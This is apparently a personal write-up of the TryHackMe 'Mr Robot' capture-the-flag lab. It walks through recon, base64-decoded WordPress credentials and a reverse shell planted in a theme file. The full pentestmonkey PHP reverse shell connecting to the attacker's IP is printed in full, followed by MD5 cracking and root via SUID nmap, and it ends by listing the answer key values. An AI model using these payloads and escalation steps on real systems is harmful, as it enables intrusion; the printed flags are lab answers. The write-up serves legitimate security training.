# TryHackMe — Mr Robot CTF

My own writeup for this one, going through it in the order I actually did things —
including the dead ends, because those are usually the more instructive part.

**Target:** `10.49.189.13`
**Attacking box:** Kali, `tun0` = `192.168.179.226`

---

## Recon

### Nmap first

```bash
nmap -sC -sV 10.49.189.13
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 06:35 -0400
Nmap scan report for 10.49.189.13
Host is up (0.023s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
```

Worth noting: Nmap reports all three ports as **closed**, not open. On TryHackMe-hosted AWS
targets this is a known quirk — the box was still perfectly reachable over HTTP the whole
time, Nmap's SYN/service probes just get filtered oddly on some of these instances. Don't
trust this output at face value; go straight to browsing/gobuster-ing port 80 regardless of
what Nmap claims.

### Directory brute-force with gobuster

First typo'd `dir` instead of `gobuster dir` — small reminder to double check tool names
before hitting enter.

```bash
gobuster dir -u http://10.49.189.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Relevant hits out of a long, noisy run (I let it go to ~28% before Ctrl-C'ing — got what I
needed well before that):

```
images               (Status: 301) [Size: 235] [--> http://10.49.189.13/images/]
blog                 (Status: 301) [Size: 233] [--> http://10.49.189.13/blog/]
sitemap              (Status: 200) [Size: 0]
login                (Status: 302) [Size: 0] [--> http://10.49.189.13/wp-login.php]
wp-content           (Status: 301) [Size: 239] [--> http://10.49.189.13/wp-content/]
admin                (Status: 301) [Size: 234] [--> http://10.49.189.13/admin/]
intro                (Status: 200) [Size: 516314]
wp-login             (Status: 200) [Size: 2606]
license              (Status: 200) [Size: 309]
wp-includes          (Status: 301) [Size: 240] [--> http://10.49.189.13/wp-includes/]
readme               (Status: 200) [Size: 64]
robots               (Status: 200) [Size: 41]
dashboard            (Status: 302) [Size: 0] [--> http://10.49.189.13/wp-admin/]
wp-admin             (Status: 301) [Size: 237] [--> http://10.49.189.13/wp-admin/]
phpmyadmin           (Status: 403) [Size: 94]
xmlrpc               (Status: 405) [Size: 42]
wp-signup            (Status: 302) [Size: 0] [--> http://10.49.189.13/wp-login.php?action=register]
```

The two I care about right away: **`/robots`** and **`/license`**. Standard WordPress paths
(`wp-login`, `wp-admin`, `wp-content`, `xmlrpc`) confirm this is a WordPress site running
`Twenty Fifteen`-era WP (learned this later, when I got into the theme editor).

Also spammed a bunch of `[ERROR] error on word ...: timeout occurred during the request` lines
throughout — the target seems to rate-limit or just gets overwhelmed under gobuster's default
10 threads. Didn't slow me down since I already had what I needed, but worth flagging if a
future run needs to be more exhaustive — I'd drop threads or add `--delay` next time.

---

## `/robots.txt` → key 1

Browsed to `http://10.49.189.13/robots`:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

A `robots.txt` telling search engines not to index `fsocity.dic` and `key-1-of-3.txt` is a
gift — it's literally pointing at two files sitting in the web root. Just requested the key
file directly:

```
http://10.49.189.13/key-1-of-3.txt
```

**Key 1:** `073403c8a58a1f80d943455fb30724b9`

(`fsocity.dic` is the custom wordlist referenced by the room — grabbed it too in case I needed
it for brute-forcing later, but didn't end up needing it.)

---

## `/license` → base64 creds

Browsed to `http://10.49.189.13/license` and found a base64-looking string sitting on the
page:

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Threw it into CyberChef with a **From Base64** recipe (default alphabet
`A-Za-z0-9+/=`, "Remove non-alphabet chars" checked):

**Output:**
```
elliot:ER28-0652
```

So — username `elliot`, password `ER28-0652`.

---

## WordPress login

Took those credentials to:

```
https://10.49.189.13/wp-login.php
```

Logged in successfully as `elliot` — dashboard confirmed **"WordPress 4.3.1 running Twenty
Fifteen theme."** Old version, and knowing the active theme is `Twenty Fifteen` matters for
the next step.

---

## Getting a shell: theme editor → reverse shell

WordPress's built-in theme editor (`Appearance → Editor`) lets an authenticated user with the
right role edit theme PHP files directly and save them — no file upload restrictions to fight,
since it's a legitimate admin feature. Since I know Twenty Fifteen is active, I can edit any of
its template files and it'll get served live.

**Steps:**
1. `Appearance` → `Editor`
2. In the Templates list on the right, selected **404 Template (404.php)** — confirmed via the
   page header: *"Twenty Fifteen: 404 Template (404.php)"*.
3. Selected all existing content in the editor box, deleted it.
4. Pasted in the pentestmonkey PHP reverse shell
   (`https://github.com/pentestmonkey/php-reverse-shell`), editing:
   ```php
   $ip = '192.168.179.226';  // my tun0 IP
   $port = 4444;
   ```
5. Clicked **Update File** → got the "File edited successfully" confirmation.

Full contents of the file I pasted in (pentestmonkey's `php-reverse-shell.php`, with `$ip`
and `$port` already updated to my values above):

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.179.226';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Started the listener:
```bash
nc -lvnp 4444
```

Then browsed to trigger the shell:
```
http://10.49.189.13/wp-includes/themes/TwentyFifteen/404.php
```

Shell landed:
```
listening on [any] 4444 ...
connect to [192.168.179.226] from (UNKNOWN) [10.49.189.13] 42562
Linux ip-10-49-189-13 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 10:55:59 up 21 min,  0 users,  load average: 4.92, 15.16, 10.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
```

In as `daemon`.

---

## Wrong turn #1 — tried to crack the hash on the target itself

Poked around `/home`:

```
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ whoami
daemon
$ cd /home
$ ls
robot
ubuntu
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Got the hash: `robot:c3fcd3d76192e4007dfb496cca67e13b`. `key-2-of-3.txt` is owned by `robot`,
`daemon` can't read it — expected, need to become `robot` first.

Upgraded the shell before doing anything else:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Then tried to save the hash to a file so John could chew on it — **but stayed on the target
by mistake**:

```
daemon@ip-10-49-189-13:/home/robot$ echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
bash: hash.txt: Permission denied
```

Same thing again after `cd ..` to `/home`:
```
$ pwd
/home/robot
$ cd ../
$ pwd
/home
$ echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
/bin/sh: 12: cannot create hash.txt: Permission denied
```

Right — `daemon` has no write access anywhere useful in `/home`. This whole detour was
pointless: John needs to run **on my own Kali box**, not on the target. The hash just needs to
be *read* off the target and *typed/copied* onto Kali — nothing about cracking happens
target-side.

Also tried `sudo` on a whim before catching this — also a dead end, no TTY:
```
$ sudo robot
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

---

## Cracking the hash — properly, on Kali this time

New terminal, on Kali, not the reverse shell:

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
cat hash.txt
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

```bash
john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Created directory: /home/gopalakrishna/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE (2026-07-02 07:02) 100.0g/s 4070Kp/s 4070Kc/s 4070KC/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Cracked instantly: **`abcdefghijklmnopqrstuvwxyz`**.

---

## `su robot` → key 2

Back on the reverse shell (had to reconnect via `nc -lvnp 4444` since the previous connection
had dropped):

```
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
ls
robot
ubuntu
cd robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
```

**Key 2:** `822c73956184f694993bede3eb39f959`

(Commands were echoing twice at this point since I hadn't re-run the pty upgrade on this fresh
connection — cosmetic issue, didn't block anything.)

---

## Privilege escalation to root

Reconnected one more time, confirmed I was `robot`, tried `sudo -i` on a hunch:

```
whoami
robot
sudo -i
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

Same TTY wall as before — `robot` isn't in a position to `sudo` cleanly from this shell either.
Not worth fighting; moved straight to hunting for SUID binaries instead.

Upgraded the shell again for this fresh connection:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -perm -4000 2>/dev/null
```

```
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Everything else here is a normal SUID binary you'd expect on any Linux box. The one that
stands out is `/usr/local/bin/nmap` — SUID root, and installed outside the usual `/usr/bin`
location, which is the tell.

Checked GTFOBins for `nmap` — old versions (pre-5.21, and this one clearly qualifies based on
its interactive-mode banner) support an interactive shell-escape.

```
robot@ip-10-49-189-13:/$ /usr/local/bin/nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

```
root@ip-10-49-189-13:/# whoami
root
root@ip-10-49-189-13:/# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

Root. Grabbed the final flag:

```
root@ip-10-49-189-13:/# cat /root/key-3-of-3.txt
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## Final Answers

| Key | Value |
|---|---|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Lessons for next time

- **`robots.txt` is free recon** — always check it before anything else touches HTTP; it can
  hand you files directly, like it did here.
- **Nmap saying "closed" doesn't mean closed** — on THM AWS-hosted boxes especially, verify
  with a direct browser/curl request before trusting the port scan.
- **Password/hash cracking always happens on my own machine, never on the target shell.** I
  burned a few minutes on this exact mistake here — tried three different times to write
  `hash.txt` inside the target's filesystem before realizing John needs to run locally on Kali,
  and the target shell's only job is to *read* the hash out, not process it.
- **`sudo` without a TTY fails predictably** — `sudo: a terminal is required...` is a signal to
  stop trying `sudo` from a raw/unupgraded shell and pivot to a different privesc vector (SUID
  hunting, in this case), not a wall worth banging against repeatedly.
- **Old SUID binaries in non-standard install paths (`/usr/local/bin` vs `/usr/bin`) are a
  strong tell** — worth specifically scanning for that pattern when triaging `find -perm -4000`
  output on any box, not just this one.
